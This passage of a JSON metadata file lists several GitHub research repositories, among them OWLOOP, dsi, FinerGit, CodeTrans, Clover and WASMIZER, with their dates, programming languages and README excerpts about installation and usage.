        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2022-11-04T16:33:39Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2022-11-05T04:40:18Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 1344078
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "96": {
        "filename": "TheEngineRoom-UniGe_OWLOOP_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/TheEngineRoom-UniGe/OWLOOP",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "<p align=\"center\">\n  <img src=\"https://github.com/TheEngineRoom-UniGe/OWLOOP/blob/master/gitRepoResources/images/descriptor_methods.png\" width=\"400\">\n</p> \n",
                    "original_header": "3. Overview of important Java-classes (in OWLOOP) and their methods"
                },
                "confidence": 0.9877674151276381,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/TheEngineRoom-UniGe/OWLOOP/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2017-05-31T17:50:21Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-21T12:44:06Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 764831
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "97": {
        "filename": "Bucket-Protocol_raffle-paper_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/Bucket-Protocol/raffle-paper",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2023-10-11T02:32:58Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-11-03T13:33:44Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Move",
                    "name": "Move",
                    "type": "Programming_language",
                    "size": 114208
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 3339
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "98": {
        "filename": "henrikingo_dsi_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/henrikingo/dsi",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "* [bin/infrastructure_provisioning.py](bin/infrastructure_provisioning.py) Deploy EC2 resources with terraform.\n* [terraform/remote-scripts/system-setup.sh](terraform/remote-scripts/system-setup.sh) Linux configurations (mount disks, install packages...)\n* [bin/workload_setup.py](bin/workload_setup.py) Install test specific dependencies (e.g. Java for YCSB)\n* [bin/mongodb_setup.py](bin/mongodb_setup.py) Deploy a MongoDB cluster\n* [bin/test_control.py](bin/test_control.py) Execute a test, collect and parse results.\n  * Currently supported benchmark tools: Mongo shell (Benchrun), YCSB, py-tpcc, Linkbench, Genny, Sysbench\n* [bin/analysis.py](bin/analysis.py) Run various checks on test log files: core files, replication lag, etc...\n* [bin/infrastructure_teardown.py](bin/infrastructure_teardown.py) terraform destroy \n* Consistency: All configuration is in the same syntax (YAML) and in a limited set of files, which\n  always have the same names, whether you use YCSB or Linkbench.\n* Tracking: All configuration changes are committed to this repo. This avoids situations where\n  performance changes are due to changes to a specially crafted AMI, generated by scripts in another\n  repo, by a person on a different team.\n* Globally shared, \"normalized\" config: All DSI binaries always read the entire set of config files.\n  For example, mongodb_setup.py will use the same SSH key as terraform used in\n  infrastructure_provisioning.py. \nYou use DSI by creating a work directory and putting some configuration files into it. (At least\nonce upon a time it was even possible to run all DSI commands using just defaults, without any\nconfiguration files.) This directory will also hold your terraform tfstate files, benchmark output,\nlogs, etc... \nA helper script [bin/bootstrap.py](bin/bootstrap.py) is a convenient way to create a directory and\ncopy some canned configuration files into it. In fact, we almost always use files available under\n[configurations/](configurations/). You list the combination of configs you want to use in a simple\n`bootstrap.yml` file. See\n[configurations/bootstrap.example.yml](configurations/bootstrap.example.yml) to get started! \nThe second level is split into one file per section, but are logically a single\nconfiguration. The reason for splitting into multiple files is modularity: Whether you want to\ndeploy a 1-node or 3-node replica set, you can use the same test_control.yml with both. \n",
                    "original_header": "Navigating and using this repo"
                },
                "confidence": 0.9938567447871467,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/henrikingo/dsi/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "    testscripts/run-nosetest.sh \n    testscripts/run-nosetest.sh bin/tests/test_bootstrap.py\n \n",
                    "original_header": "Development &amp; Testing"
                },
                "confidence": 0.9684708904377439,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/henrikingo/dsi/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2020-03-05T10:49:09Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2022-05-06T17:12:13Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 820037
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HCL",
                    "name": "HCL",
                    "type": "Programming_language",
                    "size": 38451
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 13568
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "99": {
        "filename": "kusumotolab_FinerGit_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/kusumotolab/FinerGit",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "FinerGit is still under development. We mainly use MacOS + JDK21 + IntelliJ IDEA in our FinerGit development.\nWe rarely test FinerGit on Windows environment. \n[cregit](https://github.com/cregit/cregit) and [git-stein](https://github.com/sh5i/git-stein) are other tools that convert/rewrite Git repositories.\nFinerGit internally uses git-stein.\n \n",
                    "original_header": "At the end"
                },
                "confidence": 0.9937922893642512,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/kusumotolab/FinerGit/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "FinerGit \u306f Java \u30e1\u30bd\u30c3\u30c9\u306e\u5909\u66f4\u5c65\u6b74\u3092\u5bb9\u6613\u306b\u53d6\u5f97\u3059\u308b\u3053\u3068\u3092\u76ee\u7684\u3068\u3057\u3066\u958b\u767a\u3055\u308c\u3066\u3044\u308b\u30c4\u30fc\u30eb\u3067\u3059\uff0e\nGit \u306e\u30e1\u30ab\u30cb\u30ba\u30e0\u3092\u5229\u7528\u3057\u3066 Java \u30e1\u30bd\u30c3\u30c9\u306e\u5909\u66f4\u5c65\u6b74\u3092\u53d6\u5f97\u3057\u307e\u3059\uff0e\nFinerGit \u306e\u5165\u529b\u306f Java \u30bd\u30fc\u30b9\u30b3\u30fc\u30c9\u3092\u542b\u3080 Git \u30ea\u30dd\u30b8\u30c8\u30ea\u3067\u3059\uff0e\nFinerGit \u306e\u51fa\u529b\u306f\uff0c\u4ee5\u4e0b\u306e2\u3064\u306e\u7279\u5fb4\u3092\u3082\u3063\u305f Git \u30ea\u30dd\u30b8\u30c8\u30ea\u3067\u3059\uff0e\n- \u30bd\u30fc\u30b9\u30b3\u30fc\u30c9\u5185\u306e\u5404 Java \u30e1\u30bd\u30c3\u30c9\u304c1\u3064\u306e\u30d5\u30a1\u30a4\u30eb\u3068\u3057\u3066\u62bd\u51fa\u3055\u308c\u3066\u3044\u308b\uff0e\n- \u62bd\u51fa\u3055\u308c\u305f\u5404 Java \u30e1\u30bd\u30c3\u30c9\u306e\u5404\u884c\u306f1\u3064\u306e\u5b57\u53e5\u306e\u307f\u3092\u542b\u3080\uff0e \n1\u3064\u76ee\u306e\u7279\u5fb4\u306b\u3088\u308a\uff0cGit \u306e\u30d5\u30a1\u30a4\u30eb\u8ffd\u8de1\u6a5f\u80fd\u3092\u4f7f\u3063\u3066 Java \u30e1\u30bd\u30c3\u30c9\u3092\u8ffd\u8de1\u3059\u308b\u3053\u3068\u304c\u3067\u304d\u307e\u3059\uff0e\n2\u3064\u76ee\u306e\u7279\u5fb4\u306b\u3088\u308a\uff0cJava \u30e1\u30bd\u30c3\u30c9\u306e\u8ffd\u8de1\u53ef\u80fd\u6027\u3092\u9ad8\u3081\u308b\u3053\u3068\u304c\u3067\u304d\u307e\u3059\uff0e \n",
                    "original_header": "<a name=\"Japanese\"></a>FinerGit \uff08\u65e5\u672c\u8a9e\uff09"
                },
                "confidence": 0.9965719805725659,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/kusumotolab/FinerGit/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "FinerGit \u306f\u30b3\u30de\u30f3\u30c9\u30e9\u30a4\u30f3\u30c4\u30fc\u30eb\u3067\u3042\u308a\uff0c\u5b9f\u884c\u306b\u306f JDK (JRE\u3067\u306f\u306a\u3044) \u306e\u30d0\u30fc\u30b8\u30e7\u30f311\u4ee5\u964d\u3092\u5fc5\u8981\u3068\u3057\u307e\u3059\uff0e\n\u4ee5\u4e0b\u306e\u30b3\u30de\u30f3\u30c9\u306b\u3088\u308a\uff0cJava \u306e\u30d0\u30fc\u30b8\u30e7\u30f311\u4ee5\u964d\u304c\u30a4\u30f3\u30b9\u30c8\u30fc\u30eb\u3055\u308c\u3066\u3044\u308b\u3053\u3068\u3092\u78ba\u8a8d\u3057\u3066\u304f\u3060\u3055\u3044\uff0e\n```shell-session\n$ java -version\njava version \"11.0.6\" 2020-01-14 LTS\nJava(TM) SE Runtime Environment 18.9 (build 11.0.6+8-LTS)\nJava HotSpot(TM) 64-Bit Server VM 18.9 (build 11.0.6+8-LTS, mixed mode)\n```\n \n",
                    "original_header": "\u74b0\u5883\u306e\u78ba\u8a8d"
                },
                "confidence": 0.9999999763128361,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/kusumotolab/FinerGit/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "\u4ee5\u4e0b\u306e\u30b3\u30de\u30f3\u30c9\u3092\u9806\u306b\u5b9f\u884c\u3057\uff0cFinerGit\u3092\u30d3\u30eb\u30c9\u3057\u3066\u304f\u3060\u3055\u3044\uff0e\n```shell-session\n$ git clone https://github.com/kusumotolab/FinerGit.git\n$ cd FinerGit\n$ ./gradlew shadowJar\n``` \n`FinerGit/build/lib` \u30c7\u30a3\u30ec\u30af\u30c8\u30ea\u306b `FinerGit-all.jar` \u304c\u3067\u304d\u3066\u3044\u308c\u3070OK\u3067\u3059\uff0e\n`gradlew` \u306e\u5f15\u6570\u3068\u3057\u3066 `shadowJar` \u3067\u306f\u306a\u304f `jar` \u3084 `build` \u3092\u6307\u5b9a\u3057\u305f\u5834\u5408\u3082jar\u30d5\u30a1\u30a4\u30eb\u306f\u4f5c\u6210\u3055\u308c\u307e\u3059\u304c\uff0c\n\u305d\u306e\u5834\u5408\u306e\u540d\u524d\u306f `FinerGit.jar`\u306b\u306a\u308a\uff0c\u5358\u4f53\u3067\u5b9f\u884c\u53ef\u80fd\u306ajar\u30d5\u30a1\u30a4\u30eb\u3067\u306f\u3042\u308a\u307e\u305b\u3093\uff0e \n",
                    "original_header": "FinerGit \u306e\u30d3\u30eb\u30c9"
                },
                "confidence": 0.9979773092226596,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/kusumotolab/FinerGit/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Git \u30ea\u30dd\u30b8\u30c8\u30ea\u3092\u5909\u63db\u3059\u308b\u305f\u3081\u306e\u57fa\u672c\u30b3\u30de\u30f3\u30c9\u306f\u4ee5\u4e0b\u306e\u901a\u308a\u3067\u3059\uff0e\n```shell-session\n$ java -jar FinerGit-all.jar create --src /path/to/repoA --des /path/to/repoB\n```\n\u3053\u3053\u3067\uff0c`/path/to/repoA`\u306f\u65e2\u5b58\u306e Git \u30ea\u30dd\u30b8\u30c8\u30ea\u306e\u30d1\u30b9\uff0c`/path/to/repoB`\u306f\u751f\u6210\u3059\u308b FinerGit \u30ea\u30dd\u30b8\u30c8\u30ea\u306e\u30d1\u30b9\u3092\u8868\u3057\u3066\u3044\u307e\u3059\uff0e \nFinerGit \u306f\u5909\u63db\u306e\u30aa\u30d7\u30b7\u30e7\u30f3\u3092\u3044\u304f\u3064\u304b\u5099\u3048\u3066\u3044\u307e\u3059\uff0e\n\u30aa\u30d6\u30b7\u30e7\u30f3\u4e00\u89a7\u306f\u4ee5\u4e0b\u306e\u30b3\u30de\u30f3\u30c9\u306b\u3088\u308a\u78ba\u8a8d\u3067\u304d\u307e\u3059\uff0e\n```shell-session\n$ java -jar build/libs/FinerGit-all.jar create\n```\n \n",
                    "original_header": "FinerGit \u306e\u5b9f\u884c"
                },
                "confidence": 0.9868145130688835,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/kusumotolab/FinerGit/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "- \u62e1\u5f35\u5b50\u304c `.cjava` \u306a\u30d5\u30a1\u30a4\u30eb\u306f\uff0cJava \u306e\u30af\u30e9\u30b9\u3092\u8868\u3059\u30d5\u30a1\u30a4\u30eb\u3067\u3059\uff0e\u305f\u3060\u3057\uff0c\u305d\u306e\u4e2d\u306b\u5b9a\u7fa9\u3055\u308c\u3066\u3044\u308b\u30e1\u30bd\u30c3\u30c9\u306f\u5225\u30d5\u30a1\u30a4\u30eb\u3068\u3057\u3066\u62bd\u51fa\u3055\u308c\u3066\u3044\u307e\u3059\uff0e\n- \u62e1\u5f35\u5b50\u304c `.fjava` \u306a\u30d5\u30a1\u30a4\u30eb\u306f\uff0cJava \u306e\u30d5\u30a3\u30fc\u30eb\u30c9\u3092\u8868\u3059\u30af\u30e9\u30b9\u3067\u3059\uff0e\u306a\u304a\uff0cJava \u30d5\u30a3\u30fc\u30eb\u30c9\u306e\u30d5\u30a1\u30a4\u30eb\u540d\u306f\uff0c`\u30af\u30e9\u30b9\u540d#\u30d5\u30a3\u30fc\u30eb\u540d.fjava` \u3068\u306a\u3063\u3066\u3044\u307e\u3059\uff0e\n- \u62e1\u5f35\u5b50\u304c `.mjava` \u306a\u30d5\u30a1\u30a4\u30eb\u306f\uff0cJava \u306e\u30e1\u30bd\u30c3\u30c9\u3092\u8868\u3059\u30af\u30e9\u30b9\u3067\u3059\uff0e\u306a\u304a\uff0cJava \u30e1\u30bd\u30c3\u30c9\u306e\u30d5\u30a1\u30a4\u30eb\u540d\u306f\uff0c`\u30af\u30e9\u30b9\u540d#\u30e1\u30bd\u30c3\u30c9\u30b7\u30b0\u30cd\u30c1\u30e3.mjava` \u3068\u306a\u3063\u3066\u3044\u307e\u3059\uff0e \n\u4f8b\u3048\u3070\uff0c\n```shell-session\n$ git log \"Hoge#fuga().mjava\"\n```\n\u3068\u3044\u3046\u30b3\u30de\u30f3\u30c9\u3092\u5165\u529b\u3059\u308b\u3068\uff0c`fuga()` \u30e1\u30bd\u30c3\u30c9\u306b\u5909\u66f4\u3092\u52a0\u3048\u305f\u30b3\u30df\u30c3\u30c8\u306e\u4e00\u89a7\u3092\u5f97\u308b\u3053\u3068\u304c\u3067\u304d\u307e\u3059\uff0e\nBASH2*\n\u3068\u3044\u3046\u3088\u3046\u306b\uff0c``--follow`` \u30aa\u30d7\u30b7\u30e7\u30f3\u3092\u5229\u7528\u3059\u308c\u3070\uff0c\u30e1\u30bd\u30c3\u30c9\u540d\u3084\u305d\u308c\u3092\u542b\u3080\u30af\u30e9\u30b9\u540d\u304c\u5909\u308f\u3063\u3066\u3044\u305f\u5834\u5408\u3067\u3082\u8ffd\u8de1\u3057\u3066\uff0c\u30b3\u30df\u30c3\u30c8\u4e00\u89a7\u3092\u8868\u793a\u3057\u307e\u3059\uff0e \n",
                    "original_header": "FinerGit \u30ea\u30dd\u30b8\u30c8\u30ea\u3092\u4f7f\u3063\u3066 Java \u30e1\u30bd\u30c3\u30c9\u306e\u5909\u66f4\u5c65\u6b74\u3092\u78ba\u8a8d\u3059\u308b"
                },
                "confidence": 0.9843255247418979,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/kusumotolab/FinerGit/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "FinerGit \u306f\u4e3b\u306b\uff0cMac + JDK21 + IntelliJ IDEA \u3092\u7528\u3044\u3066\u958b\u767a\u3055\u308c\u3066\u3044\u307e\u3059\uff0e\nWindows\u74b0\u5883\u3067\u306f\u307b\u3068\u3093\u3069\u52d5\u4f5c\u78ba\u8a8d\u3092\u884c\u3063\u3066\u3044\u307e\u305b\u3093\uff0e \nGit\u30ea\u30dd\u30b8\u30c8\u30ea\u306e\u5909\u63db\uff0f\u66f8\u63db\u30c4\u30fc\u30eb\u3068\u3057\u3066\u306f\uff0c\u4ed6\u306b[cregit](https://github.com/cregit/cregit)\u3084[git-stein](https://github.com/sh5i/git-stein)\u304c\u3042\u308a\u307e\u3059\uff0e\nFinerGit \u3067\u306f\u5185\u90e8\u3067 git-stein \u3092\u5229\u7528\u3057\u3066\u3044\u307e\u3059\uff0e \n",
                    "original_header": "\u6700\u5f8c\u306b"
                },
                "confidence": 0.9711815534210464,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/kusumotolab/FinerGit/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2018-06-30T06:51:00Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-24T03:17:21Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 209663
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 104
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "100": {
        "filename": "agemagician_CodeTrans_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/agemagician/CodeTrans",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "<br/>\n<p align=\"center\">\n    <img width=\"70%\" src=\"https://cdn.pixabay.com/photo/2019/10/02/14/44/head-4521114_960_720.jpg\" alt=\"CodeTrans Attention Visualization\">\n</p>\n<br/> \n",
                    "original_header": "CodeTrans"
                },
                "confidence": 0.9914644158607001,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/agemagician/CodeTrans/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "<a name=\"question\"></a>\n## \ud83d\udceb&nbsp; Have a question? \n"
                },
                "confidence": 0.9595916147548519,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/agemagician/CodeTrans/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "We are happy to hear your question in our issues page [CodeTrans](https://github.com/agemagician/CodeTrans/issues)! Obviously if you have a private question or want to cooperate with us, you can always **reach out to us directly** via our [RostLab email](mailto:assistant@rostlab.org?subject=[GitHub]CodeTrans)  \n",
                    "original_header": "\ud83d\udceb&nbsp; Have a question?"
                },
                "confidence": 0.9929929563651684,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/agemagician/CodeTrans/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "<a name=\"bug\"></a>\n## \ud83e\udd1d&nbsp; Found a bug? \n<a name=\"requirements\"></a>\n## \u2705&nbsp; Requirements \n"
                },
                "confidence": 0.9710366231778806,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/agemagician/CodeTrans/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": " * <b>Technical University of Munich:</b><br/>\n \n| Ahmed Elnaggar       |       Wei Ding  |  Florian Matthes | Burkhard Rost |\n|:-------------------------:|:-------------------------:|:-------------------------:|:-------------------------:|\n| <img width=120/ src=\"https://github.com/agemagician/ProtTrans/blob/master/images/ElnaggarAhmend.jpg?raw=true\"> | <img width=120/ src=\"https://github.com/matchlesswei/application_project_nlp_company_description/blob/master/image/Wei_Ding.jpg?raw=true\"> | <img width=120/ src=\"https://wwwmatthes.in.tum.de/file/swwvbhnquwxq/Sebis-Public-Website/Team/20140717_7D_%2047488-3-florian-300x300.jpg\"> | <img width=120/ src=\"https://github.com/agemagician/ProtTrans/blob/master/images/B.Rost.jpg?raw=true\"> | \n| Llion Jones       |\n|:-------------------------:|\n| <img width=120/ src=\"https://github.com/agemagician/ProtTrans/blob/master/images/Llion-Jones.jpg?raw=true\"> | \n| Tom Gibbs       | Tamas Feher | Christoph Angerer |\n|:-------------------------:|:-------------------------:|:-------------------------:|\n| <img width=120/ src=\"https://github.com/agemagician/ProtTrans/blob/master/images/Tom-Gibbs.png?raw=true\"> | <img width=120/ src=\"https://github.com/agemagician/ProtTrans/blob/master/images/Tamas-Feher.jpeg?raw=true\"> | <img width=120/ src=\"https://github.com/agemagician/ProtTrans/blob/master/images/Christoph-Angerer.jpg?raw=true\"> | \n",
                    "original_header": "\ud83e\udd35&nbsp; Team"
                },
                "confidence": 0.9970234647333327,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/agemagician/CodeTrans/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2020-10-09T14:22:18Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-08-05T20:17:48Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 10024520
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "101": {
        "filename": "Simula-COMPLEX_EvoCLINICAL_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/Simula-COMPLEX/EvoCLINICAL",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2023-08-17T14:34:34Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-12-02T21:43:03Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 202097
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "102": {
        "filename": "ChuyueSun_Clover_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/ChuyueSun/Clover",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "Install [sglang](https://github.com/sgl-project/sglang)\n```\npip install \"sglang[openai]\"\n```\nSet the OpenAI API Key\n```\nexport OPENAI_API_KEY=sk-******\n```",
                    "type": "Text_excerpt",
                    "original_header": "Install requirements",
                    "parent_header": [
                        "Clover: Closed-Loop Verifiable Code Generation [<a href=\"https://arxiv.org/abs/2310.17807\">paper</a>]"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/ChuyueSun/Clover/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-10-23T22:57:56Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-10-03T07:36:46Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Dafny",
                    "name": "Dafny",
                    "type": "Programming_language",
                    "size": 1191310
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 95427
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "103": {
        "filename": "arash-mazidi_WASMIZER_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/arash-mazidi/WASMIZER",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Wasmizer, a tool that regularly collects WebAssembly-driven projects on GitHub, compiles them, and curates an up-to-date and growing dataset of WebAssembly sources and binaries.\r\n\r\nWasmizer has two main phases:\r\n\r\n_1. Repository collection_\r\n\r\nIt identifies C and C++ projects on GitHub using Github search API (https://docs.github.com/en/rest/search?apiVersion=2022-11-28). There are some limitations on the search API such as rate limitation that we make a delay between requests to overcome this limitation. Another limitation is the maximum number of retrieved repositories in the search API that is 1000. We overcome this limitation by defining short period of date to have less than 1000 repositories. In addition, each page includes 100 repositories and we use a loop to have repositories in all pages.\r\nWe excluded the forks of another repository to prevent duplicate projects.\r\nWe had to select GitHub projects as, practically, we cannot analyse all the C or C++ projects. Therefore, we set up several selection criteria such as WebAssembly-related keywords, minimum number of stars and forks, minimum size of the projects, date of the last pushed, and WebAssembly symptoms in the config.json. It firstly collect projects based on the keywords, then filters the projects based on the symptoms in their code.\r\n\r\n_2. Compilation_\r\n\r\nIn the compilation phase, Wasmizer clones the target repositories as long as they are not already compiled or it is pushed after the previous compilation date. We need to install the necessary tools for compilation and build tools. As Wasmizer is initially built to compile C/C++ projects to WebAssembly and therefore we use Emscripten (https://emscripten.org/docs/getting_started/downloads.html | We used Docker image). In addition, In addition, in order to convert wat files to wasm files, you need to install wat2wasm tool. You can use https://github.com/WebAssembly/wabt for this goal. \r\nIt then searches for precompilation and compilation source files and automatically compiles each project based on the compilation commands. We identified each CMakeLists.txt file, indicating the use of the cmake build system, we run Emscripten\u2019s cmake wrapper (emcmake). Then, for each Makefile, either resulting from the previous step, or standalone, we run Emscripten\u2019s make wrapper (emmake). It should be noted, compilation source files and commands are stored in the config.json file. Therefore, Wasmizer can be adapted to a different language such as rust by replacing the compilation commands in the config.json file. We also use github commit API in order to retrieve the commit sha of the projects. We consider the latest commit, so the first commit in the retrieved list will be the target commit. Then, we get the commit sha and store it in the metadata.csv file. \r\n\r\nAfter applying the compilation phase to all projects, it looks for files that are named with either a .wasm or a .wat extension, indicating that they are WebAssembly files. We try to convert all .wat files found into their binary version (.wasm) relying on the wat2wasm tool from the WebAssembly Binary Toolkit, configured with the --enable-all flag to enable all available WebAssembly extensions. We then store all .wasm files in a new directory (wasm-wat-files), under a name composed of the SHA-256 sum of their content. This is to ensure that duplicate files are only present once in the dataset. We store a metadata.csv contains information of the binary files such as name, url, forks, stars, size, creation date, last commit date, commit sha etc.\r\nWasmizer also separates the binary files that were already exist and new generated binary files in two folders (wasm-wat-files-pre and wasm-wat-files). \r\n\r\n\r \n",
                    "original_header": "What is Wasmizer?"
                },
                "confidence": 0.9935224930610018,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/arash-mazidi/WASMIZER/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "\r\nYou can clone and run the Wasmizer:\r\n\r\n1- Clone the project: Open a Command Prompt (cmd.exe), use this command: git clone https://github.com/arash-mazidi/WASMIZER.git\r\n\r\n2- Open the project in Eclipse IDE\r\n\r\n3- There is a lib folder in the project that contains libraries that are needed to run Wasmizer. You can import all libraries in the classpath of the project. We tested the Wasmizer on the Eclipse IDE.\r\n\r\n4- Set up the config.json file (It is explained in the previous sections).\r\n\r\n5- Run the Wasmizer by running the WASMIZER/blob/main/src/WASMIZER/WASMIZER_class.java.\r\n\r\n\r\nFurthermore, name and date of all cloned repositories will be stored in the clonedrepo.csv and cloneddate.csv files, respectively.\r\n\r\n\r \n",
                    "original_header": "How to launch Wasmizer?"
                },
                "confidence": 1.0,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/arash-mazidi/WASMIZER/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-01-25T17:44:13Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
